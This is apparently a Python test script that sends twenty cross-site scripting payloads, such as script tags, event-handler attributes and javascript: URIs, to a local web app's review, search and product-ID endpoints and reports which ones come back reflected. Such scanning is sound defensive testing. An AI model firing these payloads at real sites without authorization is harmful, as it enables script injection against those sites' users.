#!/usr/bin/env python3
"""
XSS Injection Attack Simulation
Tests Cross-Site Scripting vulnerabilities
"""

import requests
import time

BASE_URL = "http://localhost:3001"

# XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>Hover me</div>",
    "<img src=x onerror=\"alert('XSS')\">",
    "<svg><script>alert('XSS')</script></svg>",
    "<math><mi//xlink:href=\"javascript:alert('XSS')\">CLICK</mi></math>",
    "<link rel=stylesheet href=javascript:alert('XSS')>",
    "<style>@import'javascript:alert(\"XSS\")';</style>"
]

def test_review_xss():
    """Test XSS in review submission"""
    print("💬 Testing XSS in Review Submission...")
    print(f"Target: {BASE_URL}/api/reviews\n")
    
    for i, payload in enumerate(XSS_PAYLOADS[:10], 1):
        try:
            response = requests.post(
                f"{BASE_URL}/api/reviews",
                json={
                    "productId": 1,
                    "rating": 5,
                    "comment": payload,
                    "userName": f"<script>alert('XSS_{i}')</script>"
                },
                timeout=5
            )
            
            print(f"Payload {i}: {payload[:50]}...")
            print(f"   Status: {response.status_code}")
            
            # Check if payload is reflected
            response_data = response.json()
            if payload in str(response_data):
                print(f"   ⚠️  XSS PAYLOAD REFLECTED!")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_search_xss():
    """Test reflected XSS in search parameter"""
    print("\n🔍 Testing Reflected XSS in Search...")
    print(f"Target: {BASE_URL}/api/users?search=PAYLOAD\n")
    
    for i, payload in enumerate(XSS_PAYLOADS[:5], 1):
        try:
            response = requests.get(
                f"{BASE_URL}/api/users",
                params={"search": payload},
                timeout=5
            )
            
            print(f"Payload {i}: {payload[:50]}...")
            print(f"   Status: {response.status_code}")
            
            # Check if payload is reflected
            if payload in response.text:
                print(f"   ⚠️  XSS PAYLOAD REFLECTED!")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_product_id_xss():
    """Test XSS in product ID parameter"""
    print("\n🛍️  Testing XSS in Product ID...")
    
    for payload in XSS_PAYLOADS[:3]:
        try:
            response = requests.get(
                f"{BASE_URL}/api/reviews",
                params={"productId": payload},
                timeout=5
            )
            
            print(f"Payload: {payload[:50]}...")
            print(f"   Status: {response.status_code}")
            
            if payload in response.text:
                print(f"   ⚠️  XSS PAYLOAD REFLECTED!")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

if __name__ == "__main__":
    test_review_xss()
    test_search_xss()
    test_product_id_xss()
    print("\n✅ XSS injection tests completed")
